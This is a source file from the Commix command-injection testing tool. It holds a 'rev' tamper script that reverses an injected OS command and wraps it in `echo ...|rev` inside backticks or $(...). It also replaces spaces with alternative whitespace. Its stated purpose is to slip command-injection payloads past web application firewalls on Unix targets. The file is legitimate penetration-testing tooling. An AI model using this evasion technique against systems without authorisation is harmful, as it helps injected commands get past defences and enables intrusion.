#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2024 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

from src.utils import settings
from src.thirdparty.six.moves import urllib as _urllib

"""
About: Is used to reverse (characterwise) the user-supplied operating system commands.
Notes: This tamper script works against Unix-like target(s).
References: [1] https://github.com/commixproject/commix/issues/408
            [2] https://medium.com/picus-security/how-to-bypass-wafs-for-os-command-injection-2c5dd4e6a52b
"""

__tamper__ = "rev"

if not settings.TAMPER_SCRIPTS[__tamper__]:
  settings.TAMPER_SCRIPTS[__tamper__] = True

def tamper(payload):
  if settings.EXPLOITATION_PHASE:
    if settings.USER_SUPPLIED_CMD in settings.RAW_PAYLOAD:
      if settings.USE_BACKTICKS:
        rev_cmd = "`echo " + settings.USER_SUPPLIED_CMD[::-1] + "|rev`"
      else:
        rev_cmd = "$(echo " + settings.USER_SUPPLIED_CMD[::-1] + "|rev)"
      payload = settings.RAW_PAYLOAD.replace(settings.USER_SUPPLIED_CMD, rev_cmd).replace(settings.SINGLE_WHITESPACE, settings.WHITESPACES[0])
  return payload

# eof